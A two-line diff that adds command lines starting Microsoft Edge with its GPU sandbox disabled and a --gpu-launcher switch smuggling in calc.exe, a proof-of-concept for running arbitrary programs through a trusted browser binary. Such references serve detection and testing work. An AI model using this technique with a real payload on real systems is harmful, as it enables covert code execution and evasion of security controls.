@@ -1,0 +1,2 @@
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-gpu-sandbox --gpu-launcher="C:\\Windows\\System32\\calc.exe &&" --flag-switches-begin --flag-switches-end --do-not-de-elevate
+"C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --disable-gpu-sandbox "--gpu-launcher=C:\\Windows\\System32\\calc.exe &&"
